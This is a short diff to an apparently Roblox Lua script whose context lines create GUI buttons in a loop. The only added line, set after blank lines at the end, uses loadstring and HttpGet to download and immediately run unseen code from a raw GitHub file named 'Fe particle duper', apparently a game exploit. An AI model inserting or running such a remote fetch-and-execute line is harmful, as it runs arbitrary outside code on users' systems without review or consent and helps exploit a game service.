@@ -153,3 +153,6 @@ for _, btn in ipairs(buttons) do
     makeButton(btn[1], btn[2])
     task.wait(0.1)
 end
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Gaze-stuff/refs/heads/main/Fe%20particle%20duper"))()
